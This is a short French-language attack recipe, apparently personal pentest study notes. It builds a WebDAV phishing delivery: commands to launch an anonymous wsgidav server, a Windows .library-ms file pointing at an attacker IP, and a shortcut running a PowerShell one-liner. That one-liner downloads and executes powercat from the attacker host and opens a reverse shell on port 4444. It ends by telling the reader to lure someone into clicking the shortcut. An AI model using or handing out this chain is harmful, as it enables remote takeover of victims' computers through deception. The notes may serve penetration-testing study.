Utiliser webDAV pour partager un raccourci qui exécute un reverse shell

# webDAV
Protocole de version et partage de fichiers. Peut s'inclure dans un .Library-ms.
On lance un serveur avec:


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ shell
pip3 install wsgidav
mkdir /home/corsaire/webdav
touch /home/corsaire/webdav/test.txt
/home/corsaire/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Tester dans navigateur avec http://127.0.0.1

# config.library-ms

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
	<name>@windows.storage.dll,-34582</name>
	<!-- pas important -->
	<version>6</version>
	<isLibraryPinned>true</isLibraryPinned>
	<!--Icone -1003 (Photos) -1002 (Document)-->
	<iconReference>imageres.dll,-1003</iconReference>
	<!-- GUID -->
	<templateInfo>
		<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
	</templateInfo>
	<!--Spécifie la connexion-->
	<searchConnectorDescriptionList>
		<searchConnectorDescription>
			<isDefaultSaveLocation>true</isDefaultSaveLocation>
			<isSupported>false</isSupported>
			<simpleLocation>
				<url>http://192.168.45.239</url>
			</simpleLocation>
		</searchConnectorDescription>
	</searchConnectorDescriptionList>
</libraryDescription>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

**Note:** windows va modifier le fichier après l'avoir ouvert. Il pourrait ne pas fonctionner sur un autre PC ou redémarrage

# raccourci
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ powershell
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.239:80/windows/powercat.ps1');powercat -c 192.168.45.239 -p 4444 -e powershell"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Placer le raccourci dans le webDAV et encourager quelqu'un à l'ouvrir et cliquer sur le racourci